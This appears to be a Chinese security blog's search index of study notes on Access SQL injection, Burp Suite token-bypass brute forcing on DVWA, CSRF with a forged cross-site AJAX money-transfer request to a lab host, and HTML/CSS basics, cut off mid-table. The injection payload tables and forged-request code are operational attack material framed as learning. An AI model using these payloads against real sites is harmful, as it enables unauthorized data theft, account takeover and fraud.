<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Access注入</title>
    <url>/article/Access%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>端口：无</p>
<p>没有数据库概念，一个文件就是一个库</p>
<p>通常是asp+access搭配，只存在联合查询和bool盲注两种注入方式</p>
<p><strong>Access数据库结构：</strong></p>
<p>表名-&gt;列名-&gt;内容数据</p>
<p>asp、aspx通常为mssql或access数据库</p>
<table>
<thead>
<tr>
<th align="left">判断</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>and exists (select * from msysobjects)&gt;0</code></td>
<td align="left">access</td>
</tr>
<tr>
<td align="left"><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code></td>
<td align="left">mssql</td>
</tr>
<tr>
<td align="left">and sleep(3)</td>
<td align="left">mysql</td>
</tr>
</tbody></table>
<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断数据库类型</td>
<td align="left"><code>and exists (select * from msysobjects)&gt;0</code> <br>返回正为access数据库 <br><br><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code> <br>返回正常是mssql数据库</td>
</tr>
<tr>
<td align="left">判断注入点</td>
<td align="left">and 1=1 <br>and 1=0</td>
</tr>
<tr>
<td align="left">判断列数</td>
<td align="left">order by</td>
</tr>
<tr>
<td align="left">猜解表名、列名</td>
<td align="left">1、union猜解 <br>猜表名 <br><code>?id=1 union select 1,2,3,4 from 表名</code> <br>猜列名 <br><code>?id=1 union select 1,列名,3,4 from 表名</code> <br><br>2、exists猜解 <br>猜表名 <br><code>?id=1 and exists(select * from 表名)</code> <br>或 <br><code>?id=1 and 0 &lt; &gt; (select count(*) from 表名)</code> <br><br>猜列名 <br><code>?id=1 and exists(select 列名 from 表名)</code></td>
</tr>
<tr>
<td align="left">暴数据</td>
<td align="left">1、盲注 <br>猜长度： <br><code>?id=1 and (select top 1 len(列名) from 表名)=猜解的长度</code> <br>猜内容： <br><code>?id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;猜解的ascii码值</code>  <br><br>2、移位溢出 <br><code>union select 1,2,3,4,5,6,7,table.* from 表名;</code> <br><code>union select 1,2,3,4,5,6,table.*,7 from 表名;</code> <br><code>union select 1,2,3,4,5,table.*,6,7 from 表名;</code></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>Access</tag>
      </tags>
  </entry>
  <entry>
    <title>Burpsuite绕过Token爆破</title>
    <url>/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
<p>环境：</p>
<p>DVWA + Burpsuite Pro</p>
<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
<p>2、进行如下配置</p>
<p>Position模块</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" alt="image-20210809164115625" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>



<p>Paloads模块 – 1</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" alt="image-20210809164127222" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>

<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
<p>Resource Pool模块</p>
<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" alt="image-20210809164239466" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>

<p>Option模块</p>
<p>选择Grep Extract模块</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" alt="image-20210809164250278" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" class="lozad post-image"></p>
<p>点击Add，依次填写</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" alt="image-20210809164302558" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>



<p>Redirections模块</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" alt="image-20210809164312043" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>



<p>最后，回到Payloads模块</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" alt="image-20210809164328050" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>

<p>3、结果</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" alt="image-20210809164338459" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>



<p>按照长度排序（状态码相同，无法参考）</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" alt="image-20210809164352072" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" class="lozad post-image"></p>
<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
<p>至此，token绕过爆破攻击结束。</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>绕过Token爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>Burpsuite挂梯子抓包</title>
    <url>/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）</p>
<p>然而挂了代理之后，bp就无法使用了。</p>
<h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p><img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" alt="image-20210809165555796" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" class="lozad post-image"></p>
<p>1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框</p>
<p>2、点击Add</p>
<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" alt="image-20210809165603927" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：*全部</span><br><span class="line">2：127.0.0.1</span><br><span class="line">3：梯子的端口</span><br><span class="line">4：None</span><br><span class="line">OK</span><br></pre>

<p>3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。</p>
<p>注：梯子需要选择全局代理，否则国内网站依旧是真实ip。</p>
<p>4、效果</p>
<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" alt="image-20210809165614071" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" class="lozad post-image"></p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>BurpSuite代理</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/article/CSRF/</url>
    <content><![CDATA[<p>CSRF，（Cross-siterequestforgery），跨站请求伪造。</p>
<p>强制终端用户在当前对其进行身份验证后的Web应用程序上执行非本意的操作。CSRF攻击的着重点在伪造更改状态的请求，而不是盗取数据，因为攻击者无法查看对伪造请求的响应</p>
<h1 id="一、CSRF与XSS的区别"><a href="#一、CSRF与XSS的区别" class="headerlink" title="一、CSRF与XSS的区别"></a>一、CSRF与XSS的区别</h1><p>原理角度：</p>
<p>XSS是将恶意的代码插入到html页面中，当用户浏览页面时，插入的html代码会被执行，从而达到最终目的。</p>
<p>CSRF是一种欺骗受害者提交恶意请求的攻击。代表受害者执行非本意、恶意的操作</p>
<p>其他角度：</p>
<p>1、CSRF比XSS漏洞危害更高，相对XSS而言较难防御。</p>
<p>2、CSRF可以做到的事情，XSS都可以做到。</p>
<p>3、XSS有局限性，而CSRF没有局限性。</p>
<p>4、XSS针对客户端，而CSRF针对服务端。</p>
<p>5、XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。</p>
<h1 id="二、CSRF攻击的条件"><a href="#二、CSRF攻击的条件" class="headerlink" title="二、CSRF攻击的条件"></a>二、CSRF攻击的条件</h1><p>1、目标用户登录受信任的网站A，并在本地生成cookie</p>
<p>2、目标用户身份认证未过期（直接关闭网站，未退出）的情况下，访问网站B</p>
<p>方式</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">1、构造修改信息的连接，短网址伪装<br> 2、构造修改信息的html，使用src标签引用网址连接</td>
</tr>
<tr>
<td align="left">POST</td>
<td align="left">burpsuite-Engagement tool-Generate CSRF PoC工具，自动生成html <br>注意：删除原有submit标签，使用script标签自动提交表单（添加id） <code>&lt;script&gt;document.getElementById(&#39;xx&#39;).submit()&lt;/script&gt;</code></td>
</tr>
</tbody></table>
<p>网站克隆</p>
<p><a href="https://bazhan.me/">https://bazhan.me</a></p>
<p><strong>同源策略</strong></p>
<p>如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源。</p>
<p>受约束对象：</p>
<p>DOM、Cookie、第三方插件以及XMLHttpRequest（Ajax）都受到同源策略的约束</p>
<p>不受约束对象：</p>
<p>页面中的链接，重定向以及表单提交是不会受到同源策略限制的。</p>
<p>跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的<code>&lt;script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;</code>等带src属性的标签。</p>
<p><strong>非同源受到的限制：</strong></p>
<p>Cookie、LocalStorage和IndexDB无法读取。</p>
<p>DOM无法获得。</p>
<p>AJAX请求能发送但是不能接收。</p>
<h1 id="三、AJAX"><a href="#三、AJAX" class="headerlink" title="三、AJAX"></a>三、AJAX</h1><p>Ajax 的全称是asynchronous javascript and xml，</p>
<p>用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新。</p>
<p>需要jquery支持，可以通过document穿件对象方式，引入js库</p>
<pre class="highlight"><span class="line">s=document.createElement(&#x27;script&#x27;)</span><br><span class="line"></span><br><span class="line">s.src=&quot;http://code.jquery.com/jquery-latest.js&quot;</span><br><span class="line"></span><br><span class="line">document.body.appendChild(s)</span><br></pre>

<p>发送get包</p>
<pre class="highlight"><span class="line">$.get(&#x27;http://192.168.21.112:9000/xxxx&#x27;)</span><br></pre>

<p>发送post包</p>
<pre class="highlight"><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">  url: &quot;http://192.168.21.33/csrf/bank/self.php&quot;,</span><br><span class="line"></span><br><span class="line">  type: &quot;POST&quot;,</span><br><span class="line"></span><br><span class="line">  crossDomain: true, //设置跨域为true</span><br><span class="line"></span><br><span class="line">  xhrFields: &#123;</span><br><span class="line"></span><br><span class="line">		withCredentials: true //默认情况下，标准的跨域请求是不会发送cookie的</span><br><span class="line"></span><br><span class="line">	          &#125;,</span><br><span class="line"></span><br><span class="line">  data: &#123;</span><br><span class="line"></span><br><span class="line">   username:&quot;jiabao&quot;,</span><br><span class="line"></span><br><span class="line">   money:&quot;-90000000&quot;,</span><br><span class="line"></span><br><span class="line">   submit:&quot;%E4%BA%A4%E6%98%93&quot;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br></pre>

<h1 id="四、跨域方法"><a href="#四、跨域方法" class="headerlink" title="四、跨域方法"></a>四、跨域方法</h1><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>document.domain跨域  <br>若两个页面一级域名相同，只是二级域名不同，  那么浏览器可以通过设置document.domain来共享Cookie</td>
<td>特点：  <br>1、只能在父域名与子域名之间使用  <br>2、存在安全性问题，当一个站点被攻击后，另一个站点会引起安全漏洞  <br>3、只适用于Cookie和iframe窗口     <br>举例：  <br>网页A：<a href="http://a.ichunqiu.com/index.html">http://a.ichunqiu.com/index.html</a>  <br>网页B：<a href="http://b.ichunqiu.com/index.html">http://b.ichunqiu.com/index.html</a>  <br>设置document.domain=’ichunqiu.com’，就实现以上任意两个页面之间的通信</td>
</tr>
<tr>
<td>JSONP跨域  <br>利用<code>&lt;script&gt;</code>的src不受同源策略约束实现跨域获取数据</td>
<td>存在问题：  <br>1、存在安全性问题，需要网站双方商议基础token的身份验证  <br>2、只能是GET，不能POST  <br>3、可能被注入恶意代码，篡改页面内容，可以采用字符串过滤来规避此问题。     <br>举例：  <br>a.com/jsonp.html想得到b.com/main.js中的数据，  在a.com的jsonp.html里创建一个回调函数xxx，动态添加<code>&lt;script&gt;</code>元素，向服务器发送请求，  请求地址后面加上查询字符串，通过callback参数指定回调函数的名字。  <br>请求地址为<a href="http://b.com/main.js?callback=xxx">http://b.com/main.js?callback=xxx</a>  在main.js中调用这个回调函数xxx，并且以JSON数据形式作为参数传递</td>
</tr>
<tr>
<td>CORS跨域  <br>CORS是一个W3C标准，允许浏览器向跨源服务器发出XMLHttpRequest请求  利用JavaScript无法控制HTTP头的特点，通过目标返回的HTTP头授权是否允许跨域访问。</td>
<td>举例：  <br>a.com想得到b.com中的内容，在b.com里面添加响应头声明允许a.com的访问添加：  <br><code>Access-Control-Allow-Origin:http://a.com</code>  <br>然后a.com就可以用ajax获取b.com里的数据了  <br>注意：此方法IE8以下完全不支持，IE8-10部分支持</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML、CSS基础</title>
    <url>/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="HTML："><a href="#HTML：" class="headerlink" title="HTML："></a>HTML：</h1><p>HTML不是编程语言，而是标记语言，用来描述网页</p>
<p>HTML基础语法及标签</p>
<table>
<thead>
<tr>
<th>标签</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;!DOCTYPE&gt;  </code></td>
<td><code>&lt;!DOCTYPE&gt;  </code>不是HTML标记语言，而是声明，它是指示 web 浏览器关于页面使用哪个  <br>HTML 版本进行编写的指令 <code>&lt;!DOCTYPE  html&gt; </code></td>
</tr>
<tr>
<td><code>&lt;meta  charset=&quot;utf-8&quot;&gt;  </code></td>
<td>对于中文网页需要声明编码方式，否则会乱码  <br><code>&lt;meta  charset=&quot;gbk&quot;&gt;</code>  设置gbk编码</td>
</tr>
<tr>
<td><code> &lt;!---  ---&gt; </code></td>
<td>注释  <br><code>&lt;!---这是一个注释---&gt;  </code></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>完整的HTML页面</td>
<td></td>
</tr>
<tr>
<td><code>&lt;!DOCTYPE  html&gt;</code></td>
<td>声明</td>
</tr>
<tr>
<td><code>&lt;html&gt;&lt;/html&gt; </code></td>
<td>最外层框架，告知是html框架</td>
</tr>
<tr>
<td><code>&lt;head&gt;&lt;/head&gt;</code></td>
<td>头部元素，包含编码语言和页面标题</td>
</tr>
<tr>
<td><code>&lt;meta  charset=&quot;utf-8&quot;&gt;</code></td>
<td>声明编码</td>
</tr>
<tr>
<td><code>&lt;title&gt;&lt;/title&gt;</code></td>
<td>网页标题  <br><code>&lt;title&gt;Hello&lt;/title&gt;</code></td>
</tr>
<tr>
<td><code>&lt;body&gt;&lt;/body&gt;</code></td>
<td>网页主题，是网页的内容部分  <br><code>&lt;body&gt;  &lt;p&gt;这是正文&lt;/p&gt;  &lt;/body&gt;</code></td>
</tr>
<tr>
<td>上述标签关系如图，是网页的最小构成单元</td>
<td><img src="/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" class="lozad post-image"></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>常用标签</td>
<td></td>
</tr>
<tr>
<td><code>&lt;h1&gt;&lt;/h1&gt;</code></td>
<td>标题  h1-h6，标题级别（字体大小）由大到小 <br><code> &lt;h1&gt;这是最大级别标题&lt;/h1&gt;</code></td>
</tr>
<tr>
<td><code>&lt;p&gt;&lt;/p&gt;</code></td>
<td>段落  <br><code>&lt;p&gt;这是一个段落&lt;/p&gt;</code></td>
</tr>
<tr>
<td><code>&lt;hr&gt;  </code></td>
<td>线</td>
</tr>
<tr>
<td><code>&lt;pre&gt;&lt;/pre&gt;</code></td>
<td>预格式化文本容器,会保留空格和换行符</td>
</tr>
<tr>
<td><code>&lt;br/&gt;</code></td>
<td>换行，直接插入段落，没有闭合标签</td>
</tr>
<tr>
<td><code>&lt;a&gt;&lt;/a&gt;</code></td>
<td>链接  <br><code>&lt;a  href=&quot;https://www.baidu.com&quot;&gt;这是百度链接&lt;/a&gt;</code></td>
</tr>
<tr>
<td><code>&lt;img&gt; </code></td>
<td>图片，注意，图片标签不是成对出现  <br><code>&lt;img  src=&quot;1.jpg&quot;&gt;</code></td>
</tr>
<tr>
<td><code>&lt;ul&gt;&lt;/ul&gt;：无序列表</code>  <br><code>&lt;ol&gt;&lt;/ol&gt;：有序列表</code>  <br><code>&lt;li&gt;&lt;/li&gt;：列表项</code></td>
<td>列表  <br><code>&lt;ol&gt;</code>  <br><code>&lt;li&gt;有序列表1&lt;/li&gt;</code><br><code>&lt;li&gt;有序列表2&lt;/li&gt;</code>  <br><code>&lt;/ol&gt;</code></td>
</tr>
<tr>
<td><code>&lt;table&gt;&lt;/table&gt;：表格</code><br><code>&lt;tr&gt;&lt;/tr&gt;：行</code>  <br><code>&lt;td&gt;&lt;/td&gt;：格</code>  <br><code>&lt;th&gt;&lt;/th&gt;：表格头(加粗加黑) </code></td>
<td>创建表格  <br><code>&lt;table&gt;</code>   <br><code>&lt;tr&gt;</code>    <br><code>&lt;th&gt;Month&lt;/th&gt;</code>    <code>&lt;th&gt;Savings&lt;/th&gt;</code>   <br><code>&lt;/tr&gt;</code>   <br><br><code>&lt;tr&gt;</code>    <br><code>&lt;td&gt;January&lt;/td&gt;</code>    <code>&lt;td&gt;$100&lt;/td&gt;</code>   <br><code>&lt;/tr&gt;</code>  <br><code>&lt;/table&gt;</code></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>HTML表单</td>
<td></td>
</tr>
<tr>
<td><code>&lt;form&gt;&lt;/form&gt;</code></td>
<td>定义表单  <br><code>&lt;form  action=&quot;www.baidu.com&quot; method=&quot;get&quot;  enctype=&quot;application/x-www-form-urlencoded&quot;&gt;</code><br><code>这是表单</code><br><code>&lt;/form&gt;</code>  <br><br>action：表明表单将要提交到哪里  <br>method：表示提交用的方法分别为get和post可选  <br>enctype：规定在发送表单数据前对数据进行编码格式</td>
</tr>
<tr>
<td><code>&lt;INPUT&gt;</code></td>
<td>表单域标记  <br><code>&lt;INPUT  type= &quot;text&quot; name= &quot;文本框名称&quot; value= &quot;文本框值&quot; size=  &quot;文本框的宽度&quot; maxlength=  &quot;文本框中能输入的最大长度&quot; &gt;</code>  <br>value：输入框默认文本</td>
</tr>
<tr>
<td>type</td>
<td>表单类型  <br>text：单行文本框  <br>password：密码框，输入值以点代替  <br>checkbox：复选框  <br>radio：单选按钮  <br>submit：提交按钮  <br>button：自定义按钮</td>
</tr>
<tr>
<td>value</td>
<td>默认文本</td>
</tr>
<tr>
<td>placeholder</td>
<td>提示文字</td>
</tr>
<tr>
<td><code>&lt;div&gt;&lt;/div&gt;</code></td>
<td>块元素，可以存放文本、图片等，用来对整体设置属性</td>
</tr>
<tr>
<td><code>&lt;textarea&gt;&lt;/textarea&gt;</code></td>
<td>格式及属性  <br><code>&lt;TEXTAREA  name= &quot;名称&quot; rows=  &quot;最大可视行数&quot; cols=  &quot;最大可视列数&quot; &gt;默认多行文本</code><br><code> &lt;/TEXTAREA&gt;</code></td>
</tr>
<tr>
<td><code>&lt;select&gt;&lt;/select&gt;  </code><br><code>&lt;option&gt;&lt;/option&gt;</code></td>
<td>多选表单  <br><code>&lt;SELECT name= &quot;&quot; size= &quot;&quot; &gt; </code><br><code>&lt;OPTION  value= &quot; &quot; &gt; 选项1 &lt;/OPTION&gt;</code><br><code>&lt;OPTION  value= &quot; &quot; &gt; 选项2 &lt;/OPTION&gt; </code><br><code>&lt;/SELECT&gt;</code></td>
</tr>
</tbody></table>
<p>补充：</p>
<p>HTTP请求方式</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>发起一个请求来获得服务器上的某一资源，通过一组HTTP头和呈现数据返回客户端，GET请求中永远不会包含呈现数据</td>
</tr>
<tr>
<td>HEAD</td>
<td>与GET类似，但是HEAD只含有HTTP头信息，不含有呈现数据。侧重判断某个资源是否存在。</td>
</tr>
<tr>
<td>POST</td>
<td>向服务器提交数据，使用最为广泛</td>
</tr>
<tr>
<td>PUT</td>
<td>与POST类似，但是PUT指定了资源存放的位置，POST数据存放位置则由服务器决定。少见</td>
</tr>
<tr>
<td>DELETE</td>
<td>删除资源。少见。</td>
</tr>
<tr>
<td>OPTIONS</td>
<td>获取当前URL所支持的方法，若请求成功，会在HTTP头中更包含一个名为Allow的头，值是所支持的方法</td>
</tr>
</tbody></table>
<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><p>CSS是一种用来装饰HTML的标记集合，是对HTML标记的一种扩展，可以进一步美化HTML页面</p>
<p>语法</p>
<pre class="highlight"><span class="line">选择符+声明（声明=属性+属性值）</span><br><span class="line"></span><br><span class="line">           属性 值              属性 值</span><br><span class="line"></span><br><span class="line">   h1&#123;   color:red;     front-size:14px&#125;</span><br><span class="line"></span><br><span class="line">  选择器    声明          声明</span><br></pre>

<p>引用方式</p>
<table>
<thead>
<tr>
<th>方式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>内联样式</td>
<td>在HTML元素中使用style属性，只对当前标记里的内容有效   <br><code>&lt;p  style=&quot;display:none&quot;&gt;&lt;/p&gt;</code></td>
</tr>
<tr>
<td>内部样式表</td>
<td>在HTML文档头部head区域使用<code>&lt;style&gt;</code>元素，包含CS，全局声明，调用  <br><code>&lt;style  type=&quot;text/css&quot;&gt; </code><br><code>选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;</code><br><code>选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;</code><br><code>&lt;/style&gt;</code></td>
</tr>
<tr>
<td>外部引用</td>
<td>外部CSS，通过<code>&lt;link&gt;</code>标签引入外部的CSS文件 <br><code>&lt;link  rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;样式表文件的地址&quot;&gt;</code></td>
</tr>
</tbody></table>
<p>内部样式表总结</p>
<table>
<thead>
<tr>
<th>样式</th>
<th>语法</th>
</tr>
</thead>
<tbody><tr>
<td>类选择符</td>
<td><code>&lt;style  type=&quot;text/css&quot;&gt;  </code><br><code>.sfont&#123;  font-size:12px; </code><br><code>color:red;  &#125;</code><br><code>&lt;/style&gt; </code><br><code>&lt;p  class=&quot;sfont&quot;&gt;…&lt;/p&gt; </code></td>
</tr>
<tr>
<td>ID选择符</td>
<td><code>&lt;style  type=&quot;text/css&quot;&gt;</code><br><code>#sfont&#123; </code><br><code>font-size:12px;</code><br><code>color:red;  &#125; </code><br><code>&lt;/style&gt; </code>   <br><code>&lt;p id=&quot;sfont&quot;&gt;…&lt;/p&gt;  </code></td>
</tr>
<tr>
<td>类型选择符</td>
<td><code>&lt;style  type=&quot;text/css&quot;&gt; </code><br><code>p&#123;</code><br><code>font-size:12px;</code><br><code>color:red;  &#125;</code><br><code>&lt;/style&gt;  </code><br><code> &lt;p&gt;…&lt;/p&gt; </code></td>
</tr>
</tbody></table>
<p>样式表冲突</p>
<p>当多种样式作用于同一标记的同一属性时，会发生样式表冲突</p>
<p>优先原则</p>
<p>同一选择符：按就近原则</p>
<p>不同选择符：内联 &gt; ID &gt; 类 &gt; 类型 &gt; 外部</p>
<p>定位符</p>
<table>
<thead>
<tr>
<th>方式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>position</td>
<td></td>
</tr>
<tr>
<td>fixed<br>绝对定位</td>
<td><code>&lt;view  style=&#39;position:fixed;bottom:100rpx;right:100rpx&#39;&gt;  </code><br><code>&lt;image style=&#39; width:102rpx;  height:110rpx&#39;  src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;</code></td>
</tr>
<tr>
<td>absolute<br>绝对定位</td>
